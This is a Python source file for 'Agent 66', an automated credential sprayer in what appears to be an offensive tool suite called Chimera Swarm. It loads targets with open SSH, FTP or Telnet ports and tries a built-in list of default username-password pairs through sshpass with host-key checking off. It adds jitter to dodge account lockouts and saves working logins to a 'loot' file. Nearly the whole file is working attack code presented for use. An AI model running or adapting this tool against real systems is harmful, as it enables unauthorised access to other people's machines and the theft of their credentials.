import os
import sys
import json
import subprocess
import time

class CredSprayer:
    """
    Chimera Agent 66: Automated Credential Sprayer
    Purpose: Rapidly test common credentials against discovered services.
    """
    def __init__(self):
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.chimera_root = os.path.dirname(os.path.dirname(self.script_dir))
        self.intel_file = os.path.join(self.chimera_root, "master_intel.json")
        self.loot_file = os.path.join(self.script_dir, "../loot/successful_logins.txt")
        
        # Military Grade Basic Wordlist (Expandable)
        self.creds = [
            ("root", "root"), ("root", "toor"), ("admin", "admin"),
            ("admin", "password"), ("user", "user"), ("guest", "guest"),
            ("pi", "raspberry"), ("ubnt", "ubnt"), ("support", "support")
        ]

    def load_targets(self):
        """Reads the Master Intel to find targets with open remote ports."""
        if not os.path.exists(self.intel_file):
            print("[!] Agent 66: Master Intel missing. Run Agent 14 first.")
            return []
        
        with open(self.intel_file, 'r') as f:
            data = json.load(f)
        
        valid_targets = []
        for target in data.get("targets", []):
            # We look for SSH (22), Telnet (23), or FTP (21)
            ports = target.get("open_ports", [])
            if any(p in ports for p in ["22", "21", "23"]):
                valid_targets.append(target)
        return valid_targets

    def spray_ssh(self, ip, user, password):
        """Uses sshpass to attempt a non-interactive login."""
        # Note: You may need 'sudo apt install sshpass' on Kali
        cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {user}@{ip} 'id'"
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            if "uid=" in result.stdout:
                print(f"[!!!] SUCCESS: {user}:{password} on {ip}")
                with open(self.loot_file, "a") as f:
                    f.write(f"[SSH] {ip} -> {user}:{password}\n")
                return True
        except:
            pass
        return False

    def run_automation(self):
        targets = self.load_targets()
        if not targets:
            print("[-] Agent 66: No suitable targets found in Master Intel.")
            return

        print(f"[*] Agent 66: Starting spray on {len(targets)} targets...")
        for target in targets:
            ip = target['ip']
            ports = target['open_ports']
            
            for user, pwd in self.creds:
                if "22" in ports:
                    print(f"[*] Testing SSH {user}:{pwd} @ {ip}")
                    if self.spray_ssh(ip, user, pwd):
                        break # Move to next target if successful
                
                # Add FTP/Telnet logic here in Month 2...
                time.sleep(0.5) # Anti-Lockout Jitter

    def menu(self):
        print("\n" + "="*60)
        print("   AGENT 66 :: CREDENTIAL SPRAYER :: CHIMERA SWARM")
        print("="*60)
        print("1. Run Automated Spray (Based on Master Intel)")
        print("2. View Successful Logins (Loot)")
        print("3. Manual Single Target Spray")
        print("0. Return to Commander")
        
        choice = input("\nSelect Action > ")
        
        if choice == "1":
            self.run_automation()
        elif choice == "2":
            if os.path.exists(self.loot_file):
                os.system(f"cat {self.loot_file}")
            else:
                print("[-] No successful logins yet.")
        elif choice == "0":
            sys.exit(0)

if __name__ == "__main__":
    sprayer = CredSprayer()
    sprayer.menu()
